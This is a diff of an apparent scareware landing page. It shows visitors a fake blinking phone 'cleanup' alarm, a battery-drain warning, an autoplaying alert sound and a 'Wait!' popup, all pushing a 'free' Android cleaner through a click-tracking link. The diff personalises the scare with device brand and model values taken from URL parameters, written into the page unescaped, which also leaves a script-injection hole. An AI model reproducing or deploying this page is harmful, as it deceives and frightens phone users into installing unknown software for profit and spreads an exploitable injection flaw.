@@ -550,11 +550,16 @@
 			result = 'Phone'
 		}
 		if(name.indexOf('model') !== -1 && contains(result, 'android')) {
-			result = ''
+			result = 'Phone'
 		}
 		if(name.indexOf('browser') !== -1 && contains(result, 'android')) {
 			result = 'Internet Browser'
 		}
+
+		if(result==null||result==""){
+            result = 'Phone'
+        }
+
 		return result;
 	}
 	</script>
@@ -565,24 +570,24 @@
 		<div class="window">
 			<div class="text">
 				<h1 style="" class="blink_me">
-                <script>document.write(getURLParameter("brand"))</script>Samsung Cleanup required right now! </h1>
+                <script>document.write(getURLParameter("device_brand"))</script> Cleanup required right now! </h1>
 				<p> Your
 					<script>
-					document.write(getURLParameter("brand"))
-					</script>Samsung
+					document.write(getURLParameter("device_brand"))
+					</script>
 					<script>
-					document.write(getURLParameter("model"))
-					</script>Galaxy S5 will run slower and your battery will drain quickly. </p>
+					document.write(getURLParameter("device_model"))
+					</script> will run slower and your battery will drain quickly. </p>
 				<br>
 				<p> Clear memory and remove intrusive ads from your phone to fix this problem and speed up your
 					<script>
-					document.write(getURLParameter("brand"))
-					</script>Samsung. </p>
+					document.write(getURLParameter("device_brand"))
+					</script>. </p>
 				<br> <img src="icon.png" style="float: left; padding-right: 10px">
 				<p> Install Android Cleaner for <strong>FREE</strong> to clean your
 					<script>
-					document.write(getURLParameter("brand"))
-					</script>Samsung immediately! </p>
+					document.write(getURLParameter("device_brand"))
+					</script> immediately! </p>
 				<br> </div>
 			<div class="buttons">
 				<a class="button exitpoint" href="https://my.toruftuiov.com/click"> <span>
@@ -595,14 +600,9 @@
 	<audio autoplay="autoplay" preload="">
 		<source src="https://battery-alert.com/imitate/en/sounds/alert.mp3" type="audio/mpeg">
 	</audio>
-<!--	<script type="text/javascript">
-	navigator.vibrate = navigator.vibrate || navigator.webkitVibrate || navigator.mozVibrate || navigator.msVibrate;
-	window.onload = function() {
-		navigator.vibrate([1500, 100, 1500, 100]);
-	}
-	</script> -->
+
 	<script>
-	var alertText = "Wait!\n\nYour " + getURLParameter("brand") + " " + getURLParameter("model") + " might still be slowed down.\n\nStay on the page and install recommended app to clean your " + getURLParameter("brand") + " immediately.";
+	var alertText = "Wait!\n\nYour " + getURLParameter("device_brand") + " might still be slowed down.\n\nStay on the page and install recommended app to clean your " + getURLParameter("device_brand") + " immediately.";
 	</script>
 	<script type="text/javascript">
 	! function() {
@@ -620,12 +620,7 @@
 		} catch(o) {}
 	}();
 	</script>
-<!--	<script type="text/javascript">
-	(function(nv) {
-		nv.vibrate = nv.vibrate || nv.webkitVibrate || nv.mozVibrate || nv.msVibrate;
-		nv.vibrate([1000, 500, 1000, 500, 1000, 500, 1000, 500, 1000]);
-	})(navigator);
-	</script> -->
+
 
 
 </body></html>
